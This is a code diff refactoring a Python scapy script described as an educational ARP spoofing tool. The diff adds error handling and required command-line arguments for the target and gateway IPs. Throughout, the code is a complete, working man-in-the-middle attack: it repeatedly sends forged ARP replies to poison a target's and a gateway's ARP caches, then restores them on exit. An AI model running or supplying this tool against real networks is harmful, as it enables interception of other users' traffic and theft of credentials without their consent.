@@ -8,30 +8,55 @@ import scapy.all as scapy
 import time
 
 def spoof(target_ip, spoof_ip):
-    # Get the MAC address of the target
-    target_mac = get_mac(target_ip)
-    if not target_mac:
-        print(f"[-] Could not find MAC address for {target_ip}... Exiting.")
-        return
+    try:
+        target_mac = get_mac(target_ip)
+        if not target_mac:
+            print(f"\n[-] Could not resolve MAC for {target_ip}")
+            return
 
-    # Create the ARP response packet
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    
-    # Send the packet
-    scapy.send(arp_response, verbose=False)
-    print(f"\r[+] Sent to {target_ip}: {spoof_ip} is-at {target_mac}",end='')
+        arp_response = scapy.ARP(
+            op=2,
+            pdst=target_ip,
+            hwdst=target_mac,
+            psrc=spoof_ip
+        )
+
+        scapy.send(arp_response, verbose=False)
+
+    except PermissionError:
+        print("\n[!] Root privileges required. Use sudo.")
+        exit(1)
+
+    except Exception as e:
+        print(f"\n[!] Spoofing error: {e}")
+
 
 def get_mac(ip):
-    # Create an ARP request to get the MAC address for the given IP
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
 
-    if answered_list:
-        return answered_list[0][1].hwsrc
-    else:
+        answered_list = scapy.srp(
+            arp_request_broadcast,
+            timeout=1,
+            verbose=False
+        )[0]
+
+        if answered_list:
+            return answered_list[0][1].hwsrc
+        else:
+            return None
+
+    except PermissionError:
+        print("\n[!] Permission denied!")
+        print("[!] Run this script with sudo/root privileges.")
+        exit(1)
+
+    except Exception as e:
+        print(f"\n[!] Error while getting MAC for {ip}: {e}")
         return None
+
 
 def restore(destination_ip, source_ip):
     # Get the MAC addresses
@@ -56,29 +81,35 @@ def restore(destination_ip, source_ip):
 def main():
     import argparse
 
-    parser = argparse.ArgumentParser(description="ARP spoofing tool (for educational use only).")
-    parser.add_argument("-t","--target", help="Target IP to poison")
-    parser.add_argument("-g","--gateway", help="Gateway IP (usually the router)")
-    parser.add_argument("-i", "--interval", type=float, default=2.0, help="Seconds between packets (default: 2.0)")
+    parser = argparse.ArgumentParser(description="ARP spoofing tool (educational use only)")
+    parser.add_argument("-t", "--target", required=True)
+    parser.add_argument("-g", "--gateway", required=True)
+    parser.add_argument("-i", "--interval", type=float, default=2.0)
     args = parser.parse_args()
 
-    target_ip = args.target
-    gateway_ip = args.gateway
-    packet_count = 0
-
     print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
+    packets = 0
+
     try:
         while True:
-            spoof(target_ip, gateway_ip)  # Tell the target that we are the gateway
-            spoof(gateway_ip, target_ip)  # Tell the gateway that we are the target
-            packet_count += 2
-            print(f"\r[+] Packets sent: {packet_count}", end='')
+            spoof(args.target, args.gateway)
+            spoof(args.gateway, args.target)
+            packets += 2
+            print(f"\r[+] Packets sent: {packets}", end="")
             time.sleep(args.interval)
+
     except KeyboardInterrupt:
-        print("\n[!] Detected CTRL+C ! Restoring the network, please wait...")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-        print("[+] Done. Exiting.")
+        print("\n[!] CTRL+C detected. Restoring network...")
+        restore(args.target, args.gateway)
+        restore(args.gateway, args.target)
+        print("[+] Done.")
+
+    except PermissionError:
+        print("\n[!] Permission denied. Run as root (sudo).")
+
+    except Exception as e:
+        print(f"\n[!] Unexpected error: {e}")
+
 
 
 if __name__ == '__main__':
